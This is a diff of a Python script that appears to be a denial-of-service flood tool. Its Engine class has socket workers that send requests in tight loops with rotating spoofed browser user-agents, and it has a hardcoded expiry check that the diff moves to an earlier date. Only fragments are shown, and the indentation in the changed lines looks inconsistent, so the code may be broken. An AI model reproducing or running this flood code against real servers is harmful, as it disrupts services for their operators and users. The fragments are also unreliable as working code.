@@ -18,7 +18,7 @@
 
 import socket, sys, os, time, threading, random, struct, base64, datetime
 from urllib.parse import urlparse
-import datetime,sys; sys.exit("SPOT EXPIRED !") if datetime.datetime.now() > datetime.datetime(2026, 6, 1) else None
+import datetime,sys; sys.exit("SPOT EXPIRED !") if datetime.datetime.now() > datetime.datetime(2026, 5, 20) else None
 
 
 class Theme:
@@ -436,12 +436,13 @@ class Engine:
                 with self.lock: self.sent+=1; self.bytes+=len(payload)
             except:
                 with self.lock: self.errors+=1
-    
-   
-    def _http_worker(self, ip, port, path="/"):
-       uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120", "Mozilla/5.0 (Macintosh)                        Chrome/120", "Mozilla/5.0 (X11; Linux) Chrome/120", "Mozilla/5.0 (Windows NT                10.0; rv:109.0) Firefox/121"]  
-    
-           while not self.stop_evt.is_set():
+                    
+   def _http_worker(self, ip, port, path="/"):
+        uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120",
+               "Mozilla/5.0 (Macintosh) Chrome/120",
+               "Mozilla/5.0 (X11; Linux) Chrome/120",
+               "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Firefox/121"]
+        while not self.stop_evt.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1)
@@ -455,6 +456,7 @@ class Engine:
                 with self.lock: self.sent+=1; self.bytes+=len(req)
             except:
                 with self.lock: self.errors+=1
+    
     
     def _http_methods_worker(self, ip, port, method="HTTP_POST"):
         uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120","Mozilla/5.0 (Macintosh) Chrome/120"]
